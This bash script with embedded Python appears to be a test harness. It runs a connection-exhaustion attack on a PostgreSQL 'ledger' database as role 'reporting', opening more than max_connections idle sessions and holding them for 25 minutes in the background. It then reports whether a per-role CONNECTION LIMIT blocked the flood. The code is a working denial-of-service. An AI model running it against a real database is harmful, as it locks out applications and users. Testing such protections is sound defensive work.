#!/bin/bash
# CHOKEHOLD: a nightly report job (role "reporting") leaks idle connections until the server has no slot left for anybody
# else. The application, whose connections are recycled by its pool, cannot reconnect: "remaining connection slots are
# reserved for roles with the SUPERUSER attribute". The leaked sessions are idle: they never commit anything.
# If a protection caps the role (CONNECTION LIMIT) the attacker reports the refusal and gives up.
set -uo pipefail
PY=/opt/raiden/venv/bin/python
OUT="$(mktemp /tmp/choke.XXXXXX)"; chmod 644 "$OUT"

setsid nohup runuser -u reporting -- "$PY" - > "$OUT" 2>&1 <<'PY' &
import re
import select
import sys
import time

import psycopg

DSN = "dbname=ledger host=/var/run/postgresql connect_timeout=3"
HOLD_S = 1500
conns, err = [], None
try:
    first = psycopg.connect(DSN, autocommit=True)
    conns.append(first)
    target = int(first.execute("SHOW max_connections").fetchone()[0]) + 20
    while len(conns) < target:
        conns.append(psycopg.connect(DSN, autocommit=True))
except psycopg.OperationalError as exc:
    m = re.search(r"FATAL:\s*(.*)", str(exc))
    err = (m.group(1) if m else str(exc)).strip().splitlines()[0]
if err and "too many connections for role" in err:
    print(f"ATTACK_BLOCKED: {err}", flush=True)
    for c in conns:
        c.close()
    sys.exit(0)
print(f"FLOOD_ON: {len(conns)} idle connections held by role reporting; the server answers: {err}", flush=True)
end = time.time() + HOLD_S
while time.time() < end and conns:
    # an idle connection only becomes readable when the server hangs up: no queries, a leaking client does not poll either
    ready, _, _ = select.select([c.fileno() for c in conns], [], [], 5)
    conns = [c for c in conns if c.fileno() not in ready]
PY

for _ in $(seq 1 40); do
  if grep -q -E '^(FLOOD_ON|ATTACK_BLOCKED)' "$OUT"; then
    grep -m1 -E '^(FLOOD_ON|ATTACK_BLOCKED)' "$OUT" | sed -E 's/^FLOOD_ON/ATTACK_LANDED: FLOOD_ON/'
    exit 0
  fi
  sleep 1
done
echo "choke: no verdict from the flood job within 40 s: $(tail -c 300 "$OUT")" >&2
exit 1
